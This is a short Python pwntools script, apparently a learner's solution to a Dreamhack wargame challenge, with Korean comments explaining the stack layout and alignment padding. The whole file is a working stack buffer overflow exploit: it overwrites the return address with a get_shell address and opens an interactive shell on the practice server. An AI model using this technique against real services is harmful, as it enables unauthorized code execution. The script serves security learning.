from pwn import *

#TCP connection
r = remote('host3.dreamhack.games', 18080) 

#Build payload
get_shell = b'\xaa\x06\x40\x00\x00\x00\x00\x00'
# 이렇게 하면 주소값이 리틀엔디안이 적용되어 뒤집힌 바이트형bytes 이 됨(!= 문자형 str)
payload = b'A' * 0x30 + b'B' * 0x8 + get_shell 
# 왜 더미를 0x38 즉, 56바이트나 채울까?
# 스택에 할당된 buf는 왜 이렇게 생겨먹었나?  바로 x86_64 에서 함수호출규칙의 ABI 규칙으로 인해 패딩 8바이트가 추가됨(병적으로 16바이트의 간격을 맞추려고 함)

#페이로드 전송(\n사용) & 터미널로 데이터 입력하고 프로세스 출력 확인
r.sendline(payload) # sendline같은 전송 함수는 모두 바이트형만 전송해줌
r.interactive()

'''
# 스택
buf : 40바이트
커널 rbp : 8바이트
커널 ret : 8바이트

# 전략 : [buf 40바이트 더미] + [8바이트 더미] + [8바이트 get_shell주소 뒤집어서]
'''
